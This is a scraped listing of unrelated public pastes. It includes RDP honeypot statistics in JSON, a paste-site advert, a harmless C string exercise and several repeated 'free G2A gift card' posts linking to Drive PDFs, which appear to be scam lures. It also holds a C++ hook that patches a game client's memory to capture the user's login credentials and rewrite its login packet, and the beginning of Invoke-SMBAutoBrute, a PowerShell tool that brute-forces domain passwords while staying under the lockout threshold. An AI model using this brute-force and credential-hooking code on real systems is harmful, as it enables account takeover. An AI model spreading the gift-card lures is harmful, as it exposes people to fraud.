id,title,username,language,date,content
LavNxfWS,2024-06-02_stats.json,rdp_snitch,JSON,Sunday 2nd of June 2024 07:16:19 PM CDT,"{
  ""ip"": {
    ""140.246.175.203"": 2,
    ""116.140.196.215"": 4,
    ""199.45.154.25"": 2,
    ""58.218.199.219"": 6,
    ""94.232.46.148"": 6,
    ""45.137.201.185"": 2,
    ""205.210.31.212"": 6,
    ""80.66.76.121"": 2,
    ""167.94.145.98"": 2,
    ""164.92.104.215"": 8,
    ""212.70.149.142"": 8,
    ""87.251.75.120"": 4,
    ""64.124.50.139"": 4,
    ""117.16.46.253"": 4,
    ""91.238.181.71"": 4,
    ""185.170.144.3"": 4,
    ""194.165.16.10"": 4,
    ""198.135.49.131"": 34,
    ""187.157.89.218"": 2,
    ""77.91.219.34"": 4,
    ""185.196.220.41"": 6,
    ""154.91.82.169"": 8766,
    ""116.182.20.8"": 2,
    ""194.165.16.11"": 4,
    ""198.235.24.116"": 6,
    ""152.42.242.235"": 2,
    ""60.255.174.158"": 2,
    ""183.82.117.93"": 2,
    ""167.179.37.82"": 2,
    ""43.129.251.187"": 1210,
    ""125.67.192.49"": 2,
    ""165.154.182.219"": 2,
    ""198.235.24.5"": 6,
    ""111.180.202.79"": 2,
    ""185.180.143.140"": 2,
    ""194.165.16.37"": 4,
    ""45.227.254.8"": 4,
    ""102.129.235.111"": 2,
    ""128.14.188.98"": 12,
    ""205.210.31.208"": 6
  },
  ""asn"": {
    ""AS58519"": 2,
    ""AS4837"": 6,
    ""AS398722"": 2,
    ""AS4134"": 8,
    ""AS212482"": 6,
    ""AS49581"": 2,
    ""AS396982"": 24,
    ""AS208091"": 6,
    ""AS398705"": 2,
    ""AS14061"": 10,
    ""AS204428"": 8,
    ""AS6461"": 4,
    ""AS18031"": 4,
    ""AS49434"": 4,
    ""AS197414"": 4,
    ""AS48721"": 12,
    ""AS396073"": 34,
    ""AS8151"": 2,
    ""AS43012"": 4,
    ""AS208046"": 6,
    ""AS399077"": 8766,
    ""AS137539"": 2,
    ""AS18209"": 2,
    ""AS9902"": 2,
    ""AS132203"": 1210,
    ""AS135377"": 2,
    ""AS148981"": 2,
    ""AS211680"": 2,
    ""AS267784"": 4,
    ""AS174"": 2,
    ""AS21859"": 12
  },
  ""isp"": {
    ""Cloud Computing Corporation"": 2,
    ""China Unicom CHINA169 Network"": 6,
    ""Censys, Inc."": 4,
    ""Chinanet"": 8,
    ""Xhost Internet Solutions LP"": 16,
    ""Ferdinand Zink trading as Tube-Hosting"": 2,
    ""Google LLC"": 24,
    ""DigitalOcean, LLC"": 10,
    ""SS-Net"": 8,
    ""Zayo Bandwidth"": 4,
    ""Sangmyung University"": 4,
    ""Datacenter location PAR1 France"": 4,
    ""Flyservers S.A."": 16,
    ""Majestic Hosting Solutions, LLC"": 34,
    ""Uninet S.A. de C.V."": 2,
    ""Gastabudstaden AB"": 4,
    ""ColocationX Ltd."": 6,
    ""Tcloudnet Inc"": 8766,
    ""China Unicom China169 Network"": 2,
    ""Beam Telecom Pvt Ltd"": 2,
    ""NeocomISP Limited"": 2,
    ""Aceville Pte.ltd"": 1210,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China Telecom"": 2,
    ""NSEC - Sistemas Informaticos, S.A."": 2,
    ""FTS120 EX Cogent"": 2,
    ""Zenlayer Inc"": 12
  },
  ""org"": {
    ""Chinanet SD"": 2,
    ""China United Network Communications Corporation Limited"": 4,
    ""Censys, Inc."": 4,
    ""Chinanet JS"": 6,
    ""Dmitriy Panchenko"": 6,
    ""Taurus"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 6,
    ""DigitalOcean, LLC"": 10,
    ""Global Communication Net Plc"": 8,
    ""Microsoft Corporation"": 4,
    ""Korean Education Network"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Xhostis"": 4,
    ""Flyservers S.A"": 12,
    ""Majestic Hosting Solutions, LLC"": 34,
    ""Uninet S.A. de C.V."": 2,
    ""Gastabud"": 4,
    ""Makut Investments"": 6,
    ""Tcloudnet Inc"": 8766,
    ""Unknown"": 1212,
    ""SiChuan Cable TV Network CO., LTD"": 2,
    ""Beam Telecom Pvt Ltd"": 2,
    ""NeocomISP Limited"": 2,
    ""Chinanet SC"": 2,
    ""Ucloud Information Technology"": 2,
    ""Chinanet HB"": 2,
    ""ICG 1 Inap"": 2,
    ""UAB Host Baltic"": 4,
    ""Digital Energy Technologies Limited"": 2,
    ""ZENLA"": 12
  },
  ""regionName"": {
    ""Shandong"": 2,
    ""Beijing"": 6,
    ""New York"": 2,
    ""Jiangsu"": 6,
    ""Perm Krai"": 6,
    ""Lombardy"": 2,
    ""California"": 46,
    ""North Holland"": 10,
    ""Michigan"": 2,
    ""Sofia-Capital"": 8,
    ""Washington"": 4,
    ""Seoul"": 4,
    ""\u00cele-de-France"": 4,
    ""Kaunas"": 12,
    ""Texas"": 34,
    ""Mexico City"": 2,
    ""S\u00f6dermanland County"": 4,
    ""Virginia"": 6,
    ""North West"": 8766,
    ""South West"": 2,
    ""Sichuan"": 4,
    ""Telangana"": 2,
    ""Phnom Penh"": 2,
    ""Central and Western District"": 1210,
    ""Hubei"": 2,
    ""Illinois"": 2,
    ""Vilnius"": 4,
    ""District of Columbia"": 2
  },
  ""country"": {
    ""China"": 20,
    ""United States"": 98,
    ""Russia"": 6,
    ""Italy"": 2,
    ""The Netherlands"": 10,
    ""Bulgaria"": 8,
    ""South Korea"": 4,
    ""France"": 4,
    ""Lithuania"": 16,
    ""Mexico"": 2,
    ""Sweden"": 4,
    ""Singapore"": 8768,
    ""India"": 2,
    ""Cambodia"": 2,
    ""Hong Kong"": 1210
  },
  ""account"": {
    ""142.93.8.59"": 2,
    ""(empty)"": 20,
    ""hello"": 1264,
    ""Domain"": 12,
    ""ePlqsSYEX"": 2,
    ""UrVZvi"": 2,
    ""GqBFvY"": 2,
    ""Administr"": 18,
    ""Test"": 32,
    ""927833797"": 8766,
    ""oBNwaWjid"": 2,
    ""NIpEoY"": 2,
    ""CwrDCn"": 2,
    ""Administrator"": 2,
    ""mGuikhJED"": 2,
    ""rMwSfO"": 2,
    ""sQBhQC"": 2,
    ""nz5ksafa"": 2,
    ""iHMAD"": 2,
    ""root"": 12,
    ""qhfYSDhRQ"": 2,
    ""cGNHgU"": 2,
    ""FHFbJJ"": 2
  },
  ""keyboard"": {
    ""Unknown"": 10156
  },
  ""client_build"": {
    ""Unknown"": 10156
  },
  ""client_name"": {
    ""Unknown"": 10156
  },
  ""ip_type"": {
    ""hosting"": 1296,
    ""Unknown"": 8850,
    ""proxy"": 8,
    ""hosting & proxy"": 2
  }
}"
cQiHApSq,2024-06-02_stats.json,rdp_snitch,JSON,Sunday 2nd of June 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""140.246.175.203"": 1,
    ""116.140.196.215"": 2,
    ""199.45.154.25"": 1,
    ""58.218.199.219"": 3,
    ""94.232.46.148"": 3,
    ""45.137.201.185"": 1,
    ""205.210.31.212"": 3,
    ""80.66.76.121"": 1,
    ""167.94.145.98"": 1,
    ""164.92.104.215"": 4,
    ""212.70.149.142"": 4,
    ""87.251.75.120"": 2,
    ""64.124.50.139"": 2,
    ""117.16.46.253"": 2,
    ""91.238.181.71"": 2,
    ""185.170.144.3"": 2,
    ""194.165.16.10"": 2,
    ""198.135.49.131"": 17,
    ""187.157.89.218"": 1,
    ""77.91.219.34"": 2,
    ""185.196.220.41"": 3,
    ""154.91.82.169"": 4383,
    ""116.182.20.8"": 1,
    ""194.165.16.11"": 2,
    ""198.235.24.116"": 3,
    ""152.42.242.235"": 1,
    ""60.255.174.158"": 1,
    ""183.82.117.93"": 1,
    ""167.179.37.82"": 1,
    ""43.129.251.187"": 605,
    ""125.67.192.49"": 1,
    ""165.154.182.219"": 1,
    ""198.235.24.5"": 3,
    ""111.180.202.79"": 1,
    ""185.180.143.140"": 1,
    ""194.165.16.37"": 2,
    ""45.227.254.8"": 2,
    ""102.129.235.111"": 1,
    ""128.14.188.98"": 6,
    ""205.210.31.208"": 3
  },
  ""asn"": {
    ""AS58519"": 1,
    ""AS4837"": 3,
    ""AS398722"": 1,
    ""AS4134"": 4,
    ""AS212482"": 3,
    ""AS49581"": 1,
    ""AS396982"": 12,
    ""AS208091"": 3,
    ""AS398705"": 1,
    ""AS14061"": 5,
    ""AS204428"": 4,
    ""AS6461"": 2,
    ""AS18031"": 2,
    ""AS49434"": 2,
    ""AS197414"": 2,
    ""AS48721"": 6,
    ""AS396073"": 17,
    ""AS8151"": 1,
    ""AS43012"": 2,
    ""AS208046"": 3,
    ""AS399077"": 4383,
    ""AS137539"": 1,
    ""AS18209"": 1,
    ""AS9902"": 1,
    ""AS132203"": 605,
    ""AS135377"": 1,
    ""AS148981"": 1,
    ""AS211680"": 1,
    ""AS267784"": 2,
    ""AS174"": 1,
    ""AS21859"": 6
  },
  ""isp"": {
    ""Cloud Computing Corporation"": 1,
    ""China Unicom CHINA169 Network"": 3,
    ""Censys, Inc."": 2,
    ""Chinanet"": 4,
    ""Xhost Internet Solutions LP"": 8,
    ""Ferdinand Zink trading as Tube-Hosting"": 1,
    ""Google LLC"": 12,
    ""DigitalOcean, LLC"": 5,
    ""SS-Net"": 4,
    ""Zayo Bandwidth"": 2,
    ""Sangmyung University"": 2,
    ""Datacenter location PAR1 France"": 2,
    ""Flyservers S.A."": 8,
    ""Majestic Hosting Solutions, LLC"": 17,
    ""Uninet S.A. de C.V."": 1,
    ""Gastabudstaden AB"": 2,
    ""ColocationX Ltd."": 3,
    ""Tcloudnet Inc"": 4383,
    ""China Unicom China169 Network"": 1,
    ""Beam Telecom Pvt Ltd"": 1,
    ""NeocomISP Limited"": 1,
    ""Aceville Pte.ltd"": 605,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""China Telecom"": 1,
    ""NSEC - Sistemas Informaticos, S.A."": 1,
    ""FTS120 EX Cogent"": 1,
    ""Zenlayer Inc"": 6
  },
  ""org"": {
    ""Chinanet SD"": 1,
    ""China United Network Communications Corporation Limited"": 2,
    ""Censys, Inc."": 2,
    ""Chinanet JS"": 3,
    ""Dmitriy Panchenko"": 3,
    ""Taurus"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 3,
    ""DigitalOcean, LLC"": 5,
    ""Global Communication Net Plc"": 4,
    ""Microsoft Corporation"": 2,
    ""Korean Education Network"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Xhostis"": 2,
    ""Flyservers S.A"": 6,
    ""Majestic Hosting Solutions, LLC"": 17,
    ""Uninet S.A. de C.V."": 1,
    ""Gastabud"": 2,
    ""Makut Investments"": 3,
    ""Tcloudnet Inc"": 4383,
    ""Unknown"": 606,
    ""SiChuan Cable TV Network CO., LTD"": 1,
    ""Beam Telecom Pvt Ltd"": 1,
    ""NeocomISP Limited"": 1,
    ""Chinanet SC"": 1,
    ""Ucloud Information Technology"": 1,
    ""Chinanet HB"": 1,
    ""ICG 1 Inap"": 1,
    ""UAB Host Baltic"": 2,
    ""Digital Energy Technologies Limited"": 1,
    ""ZENLA"": 6
  },
  ""regionName"": {
    ""Shandong"": 1,
    ""Beijing"": 3,
    ""New York"": 1,
    ""Jiangsu"": 3,
    ""Perm Krai"": 3,
    ""Lombardy"": 1,
    ""California"": 23,
    ""North Holland"": 5,
    ""Michigan"": 1,
    ""Sofia-Capital"": 4,
    ""Washington"": 2,
    ""Seoul"": 2,
    ""\u00cele-de-France"": 2,
    ""Kaunas"": 6,
    ""Texas"": 17,
    ""Mexico City"": 1,
    ""S\u00f6dermanland County"": 2,
    ""Virginia"": 3,
    ""North West"": 4383,
    ""South West"": 1,
    ""Sichuan"": 2,
    ""Telangana"": 1,
    ""Phnom Penh"": 1,
    ""Central and Western District"": 605,
    ""Hubei"": 1,
    ""Illinois"": 1,
    ""Vilnius"": 2,
    ""District of Columbia"": 1
  },
  ""country"": {
    ""China"": 10,
    ""United States"": 49,
    ""Russia"": 3,
    ""Italy"": 1,
    ""The Netherlands"": 5,
    ""Bulgaria"": 4,
    ""South Korea"": 2,
    ""France"": 2,
    ""Lithuania"": 8,
    ""Mexico"": 1,
    ""Sweden"": 2,
    ""Singapore"": 4384,
    ""India"": 1,
    ""Cambodia"": 1,
    ""Hong Kong"": 605
  },
  ""account"": {
    ""142.93.8.59"": 1,
    ""(empty)"": 10,
    ""hello"": 632,
    ""Domain"": 6,
    ""ePlqsSYEX"": 1,
    ""UrVZvi"": 1,
    ""GqBFvY"": 1,
    ""Administr"": 9,
    ""Test"": 16,
    ""927833797"": 4383,
    ""oBNwaWjid"": 1,
    ""NIpEoY"": 1,
    ""CwrDCn"": 1,
    ""Administrator"": 1,
    ""mGuikhJED"": 1,
    ""rMwSfO"": 1,
    ""sQBhQC"": 1,
    ""nz5ksafa"": 1,
    ""iHMAD"": 1,
    ""root"": 6,
    ""qhfYSDhRQ"": 1,
    ""cGNHgU"": 1,
    ""FHFbJJ"": 1
  },
  ""keyboard"": {
    ""Unknown"": 5078
  },
  ""client_build"": {
    ""Unknown"": 5078
  },
  ""client_name"": {
    ""Unknown"": 5078
  },
  ""ip_type"": {
    ""hosting"": 648,
    ""Unknown"": 4425,
    ""proxy"": 4,
    ""hosting & proxy"": 1
  }
}"
J97w82dK,Pastebin.ai - #1 Pastebin Alternative,xxsa,PHP,Sunday 2nd of June 2024 06:52:28 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative

its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Support Markdown & 150+ different syntax languages - All Free
Link redirect 
Simple Ads by Google Adsense Few rather than Pastebin
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.....
......................................
........."
vxAjVLv8,ü§ë G2A.com Free Gift Card Guide Jun 2024 FIX üéÅ,ssss50w,GetText,Sunday 2nd of June 2024 06:44:23 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
03 June 2024"
pnPLvkha,2024_fun_with_strings,gpsgiraldi,C,Sunday 2nd of June 2024 06:37:33 PM CDT,"#include <stdio.h>
#include <string.h>

int main()
{
    int i,j,n;
    char str0[100],str1[40];
    
//    printf(""Set size of string vector: \n"");
//    scanf(""%d"",&n);
    for(j=0;j<40;j++){
        str1[j]='%';
    }
    printf(""Let's play with something here...\n"");
    printf(""... type something so we can start it: \n"");
    setbuf(stdin,NULL);

    fgets(str0,99,stdin);
    printf(""\n... it encompasses %ld positions in the vector, that means, including 'ENTER' function"",strlen(str0));
    printf(""\n\nYou have typed:\n"");
    fputs(str0,stdout);
    for(i=0;i<strlen(str0);i++){
        if(str0[i]=='l'){
            if(str0[i+1]=='e'){
                if(str0[i+2]=='m'){
                    if(str0[i+3]=='i'){
                        if(str0[i+4]=='n'){
                            if(str0[i+5]=='s'){
                                if(str0[i+6]=='k'){
                                    if(str0[i+7]=='y'){
                                        printf(""Leminsky disse:\num homem com uma dor, √© muito mais interessante\ncaminha assim de lado\ncomo se, chegando atrasado...\nandasse mais adiante!"");
                                    }
                                }    
                            }
                        }
                    }
                }
            }
//            strcat(str1,str0);
        }
    }
//    strcpy(str1,str0);
    setbuf(stdin,NULL);

    printf(""\n\n... and in the str1 it should also read: \n"");
    strcpy(str1,str0);
    for(j=0;j<strlen(str0);j++){
        if(str0[j]=='a'||str0[j]=='e'||str0[j]=='i'||str0[j]=='o'||str0[j]=='u'){
            str1[j-1]='*';
            str1[j]='*';
        }
    }
    fputs(str1,stdout);
    return 0;
    
}
"
hMt9B8dk,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,Garoam,JavaScript,Sunday 2nd of June 2024 06:18:22 PM CDT,"G2A.com free gift card & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
dQuhVRjM,ü§ë G2A.com Free Gift Card Guide Jun 2024 FIX ü§ë,jusst2k4,GetText,Sunday 2nd of June 2024 06:07:21 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_685849.pdf

Working as of:
03 June 2024"
2nGZ7bMM,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,atakan1983,JavaScript,Sunday 2nd of June 2024 05:53:21 PM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
GEkhKVaN,ü§ëG2A.com Free Gift Card Guide June 2024 FixüéÅ,lookos13,JavaScript,Sunday 2nd of June 2024 05:28:19 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Amazon gift cards & everything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
5xaVTkx5,Login 7xxx,AMRCODEING,C++,Sunday 2nd of June 2024 05:26:27 PM CDT,"#include ""USERHOOK.h""
#include ""Common.h""

#pragma comment( lib, ""psapi.lib"" )
#pragma comment( lib, ""detours.lib"" )

static BYTE Key1[] = { 99,88,140,22,33,190,244,115,160,191,213,45,241,203,99,230,142,4,19,113,106,59,245,220,169,232,121,79,241,95,193,149 };
static BYTE Key2[] = { 101,110,251,209,129,108,198,113,154,252,111,231,84,199,183,190,57,26,225,218,121,227,232,36,55,224,48,169,254,163,166,43 };
PBYTE JumpPassword = 0, PasswordPointer;
int  SizePassword = 0, SizeServer = 0, SizeUsername = 0;
char szPassword[32], szUser[32], szServer[32];
DWORD ForwardAddress = Memory::FindPattern(""Conquer.exe"", ""\xE8\x00\x00\x00\x00\x83\xC4\x0C\x83\x4D\xFC\xFF\xFF\x75\x0C"", ""x????xxxxxxxxxx"");
DWORD RecvAddress = Memory::FindPattern(""Conquer.exe"", ""\x6A\x08\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x83\x7D\x08\x00\x0F\x84\x00\x00\x00\x00"", ""xxx????x????xxxxxx????"");
DWORD UserAddress = Memory::FindPattern(""Conquer.exe"", ""\x55\x81\xEC\x00\x00\x00\x00\x8D\x6C\x24\xFC\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x68\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x8B\xBD\x00\x00\x00\x00\x8B\xB5"", ""xxx????xxxxx????xxxx????x????x????x????xx????xx"");
DWORD SendAddress = Memory::FindPattern(""Conquer.exe"", ""\x55\x8D\xAC\x24\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x6A\xFF\x68\x00\x00\x00\x00\x64\xA1\x00\x00\x00\x00\x50\x83\xEC\x10\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x53\x56\x57\x50\x8D\x45\xF4\x64\xA3\x00\x00\x00\x00\x89\x65\xF0"", ""xxxx????x????x????xxx????xx????xxxxx????xxxx????xxxxxxxxx????xxx"");

void* sock_add = 0;
void* Ecx = 0;
UINT32 Identifier = 0, State = 0;
HookStub _SRecv;

void PrintPass()
{
	sprintf(szPassword, ""%s"", PasswordPointer);
	SizePassword = strlen(szPassword);
}

_declspec(naked) VOID WINAPI FunctionPass()
{
	__asm mov dword ptr ds : [PasswordPointer], eax
	__asm pushad
	__asm popad
	__asm mov dword ptr ss : [ebp - 0xC], eax
	__asm mov ecx, dword ptr ss : [ebp - 0xC]
	__asm call PrintPass
	__asm jmp dword ptr ds : [JumpPassword]
}

_declspec(naked) VOID WINAPI MYJMPPASS()
{
	__asm jmp FunctionPass
}


typedef signed int(__cdecl* _u)(char* Str, int a2, int a3, int a4, char* a5, void* a6, void* a7, int a8, int a9, char* a10, int a11);
signed int __cdecl _User(char* Str, int a2, int a3, int a4, char* a5, void* a6, void* a7, int a8, int a9, char* a10, int a11)
{
	DWORD PasswordAddress = Memory::FindPattern(""TQPlat.dll"", ""\x89\x45\xF4\x8B\x4D\xF4\x83\xC1\x01"", ""xxxxxxxxx"");
	if (PasswordAddress != NULL) {
		Memory::WriteMemory(PasswordAddress + 1, MYJMPPASS, 6);

		BYTE buffer[] = { JMP_OPCODE }; // jmp
		WriteProcessMemory(GetCurrentProcess(), (PBYTE)(PasswordAddress), &buffer, sizeof(buffer), NULL);
		DWORD CallDatinter = PasswordAddress + 1;
		DWORD dword;
		VirtualProtect((VOID*)CallDatinter, 4, PAGE_EXECUTE_READWRITE, &dword);
		PasswordPointer = (PBYTE)PasswordAddress - (0xFFFFFFFF - CallDatinter) + 4;
		CallDatinter = (DWORD)FunctionPass - PasswordAddress + 0xFFFFFFFF - 4;
		WriteProcessMemory(GetCurrentProcess(), (VOID*)(PasswordAddress + 1), &CallDatinter, sizeof(CallDatinter), NULL);

		BYTE bufferNop[] = { NOP_OPCODE };
		WriteProcessMemory(GetCurrentProcess(), (VOID*)(PasswordAddress + 5), &bufferNop, sizeof(bufferNop), NULL);
		JumpPassword = (PBYTE)PasswordAddress + 6;
	}
	sprintf(szUser, ""%s"", Str);
	SizeUsername = strlen(szUser);
	sprintf(szServer, ""%s"", (char*)a5);
	SizeServer = strlen(szServer);
	_u originalTQ = (_u)UserAddress;
	return originalTQ(Str, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

typedef signed int(__cdecl* _r)(int a1, signed int a2);
signed int WINAPIV _Recv(int a1, signed int a2) {
	INT length = *(UINT16*)(a1);
	int packetid = *(UINT16*)(a1 + 2);
	if (packetid == 1637)
	{
		Identifier = *(UINT32*)(a1 + 4);
		State = *(UINT32*)(a1 + 12);
	}
	using __Recv = signed int(WINAPIV *)(int, signed int);
	return ((__Recv)_SRecv.Address)(a1, a2);
}

typedef signed int(__thiscall* _s)(void*, int, int);
signed int __fastcall _Send(void* a1, void* ecx, int a2, signed int a3)
{
	sock_add = a1;
	Ecx = ecx;
	int packetid = *(UINT16*)(a2 + 2);
	if (packetid == 1942)
	{
		*(UINT16*)(a2 + 2) = 61120;//Packet ID
		*(BYTE*)(a2 + 4) = (BYTE)SizeUsername;
		*(BYTE*)(a2 + 5) = (BYTE)SizePassword;
		*(BYTE*)(a2 + 6) = (BYTE)SizeServer;
		sprintf((char*)(a2 + 10), ""%s"", szUser);
		sprintf((char*)(a2 + 10 + SizeUsername), ""%s"", szPassword);
		for (BYTE x = 0; x < SizePassword; x++)
		{
			*(BYTE*)(a2 + 10 + SizeUsername + x) = (BYTE)(*(BYTE*)(a2 + 10 + SizeUsername + x) ^ Key1[x * 44 % 32]);
			*(BYTE*)(a2 + 10 + SizeUsername + x) = (BYTE)(*(BYTE*)(a2 + 10 + SizeUsername + x) ^ Key2[x * 99 % 32]);
		}
		sprintf((char*)(a2 + 10 + SizeUsername + SizePassword), ""%s"", szServer);	
	}
	if (packetid == 2065)
	{
		*(UINT*)(a2 + 4) = Identifier;
		*(UINT*)(a2 + 8) = State;
	}
	_s originalTQ = (_s)SendAddress;
	return originalTQ(a1, a2, a3);
}
void USERHOOK::Init()
{
	
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(LPVOID&)UserAddress, _User);
	if (DetourTransactionCommit() != NO_ERROR)
	{
		exit(0);
		return;
	}


	/*DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(LPVOID&)RecvAddress, _Recv);
	if (DetourTransactionCommit() != NO_ERROR)
	{
		exit(0);
		return;
	}*/
	_SRecv.Size = 7;
	Memory::CreateHook((VOID*)RecvAddress, _Recv, &_SRecv);

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(LPVOID&)SendAddress, _Send);
	if (DetourTransactionCommit() != NO_ERROR)
	{
		exit(0);
		return;
	}


	BYTE buffer2[] = { 0x90, 0x90, 0x90, 0x90 };
	WriteProcessMemory(GetCurrentProcess(), (VOID*)(ForwardAddress), &buffer2, sizeof(buffer2), NULL);
	WriteProcessMemory(GetCurrentProcess(), (VOID*)(ForwardAddress + 1), &buffer2, sizeof(buffer2), NULL);
}



DWORD PasswordAddress = Memory::FindPattern(""TQPlat.dll"", ""\x89\x45\xF4\x8B\x4D\xF4\x83\xC1\x01"", ""xxxxxxxxx"");
DWORD ForwardAddress = Memory::FindPattern(""Conquer.exe"", ""\xE8\x00\x00\x00\x00\x83\xC4\x0C\x83\x4D\xFC\xFF\xFF\x75\x0C"", ""x????xxxxxxxxxx"");
DWORD rHASH = Memory::FindPattern(""Conquer.exe"",""\x6A\x08\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x83\x7D\x08\x00\x0F\x84\x00\x00\x00\x00"",""xxx????x????xxxxxx????"");
DWORD uHASH = Memory::FindPattern(""Conquer.exe"",""\x55\x81\xEC\x00\x00\x00\x00\x8D\x6C\x24\xFC\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x68\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x8B\xBD\x00\x00\x00\x00\x8B\xB5"",""xxx????xxxxx????xxxx????x????x????x????xx????xx"");
DWORD sHASH = Memory::FindPattern(""Conquer.exe"",""\x55\x8D\xAC\x24\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x6A\xFF\x68\x00\x00\x00\x00\x64\xA1\x00\x00\x00\x00\x50\x83\xEC\x10\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x53\x56\x57\x50\x8D\x45\xF4\x64\xA3\x00\x00\x00\x00\x89\x65\xF0"",""xxxx????x????x????xxx????xx????xxxxx????xxxx????xxxxxxxxx????xxx""); "
a26CdhZe,Untitled,Lebarra,PowerShell,Sunday 2nd of June 2024 05:19:46 PM CDT,"function Invoke-SMBAutoBrute
{
<#
.SYNOPSIS

    Performs smart brute forcing of accounts against the current domain, ensuring that
	lockouts do not occur.

    Author: Jason Lang (@curi0usJack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.0

.DESCRIPTION

    This script takes either a list of users or, if not specified, will query the domain 
	for a list of users on every brute attempt. The users queried will have a badPwdCount 
	attribute of two less than the LockoutThreshold to ensure they are not locked in the brute
	attempt, with a new list being queried for every attempt. Designed to simply input the 
	LockoutThreshold as well as a password list and then run. Note that each DC is queried
	for bad password count for each user for each brute, so this script is noisy.

.EXAMPLE

    PS C:\> Invoke-SMBAutoBrute -PasswordList ""jennifer, yankees"" -LockoutThreshold 3

	[*] Performing prereq checks.
	[*] PDC: LAB-2008-DC1.lab.com
	[*] Passwords to test: jennifer, yankees, 123456
	[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...
	[+] Success! Username: TestUser6. Password: jennifer
	[+] Success! Username: TestUser99. Password: yankees
	[*] Completed.

.PARAMETER UserList

	A text file of userids (one per line) to brute. Do not append DOMAIN\ in front of the userid.
	If this parameter is not specified, the script will retrieve a new list of user accounts for
	each attempt to ensure accounts are not locked.
	
.PARAMETER PasswordList

	A comma separated list of passwords to attempt. 
	
.PARAMETER LockoutThreshold

	The domain setting that specifies the number of bad login attempts before the account locks.
	To discover this, open a command prompt from a domain joined machine and run ""net accounts"".
	
.PARAMETER Delay

	The delay time (in milliseconds) between each brute attempt. Default 100.
	
.PARAMETER ShowVerbose

	Will display Failed as well as Skipped attempts. Generates a ton of data.
	
.PARAMETER StopOnSuccess

	The script will exit after the first successful authentication.

#>
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $False)]
        [String] $UserList,

        [parameter(Mandatory = $True)]
        [String] $PasswordList,

        [parameter(Mandatory = $True)]
        [String] $LockoutThreshold,

        [parameter(Mandatory = $False)]
        [int] $Delay,

        [parameter(Mandatory = $False)]
        [Switch] $ShowVerbose,

        [parameter(Mandatory = $False)]
        [Switch] $StopOnSuccess
    )

    Begin
    {
        Set-StrictMode -Version 2

        Try {Add-Type -AssemblyName System.DirectoryServices.AccountManagement}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}

        Try {Add-Type -AssemblyName System.DirectoryServices}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}

        function Get-PDCe()
        {
            $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext(""Domain"",""lab.com"")
            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context)
            return $domain.pdcRoleOwner
        }

        function Get-UserList($maxbadpwdcount)
        {
            $users = New-Object System.Collections.ArrayList
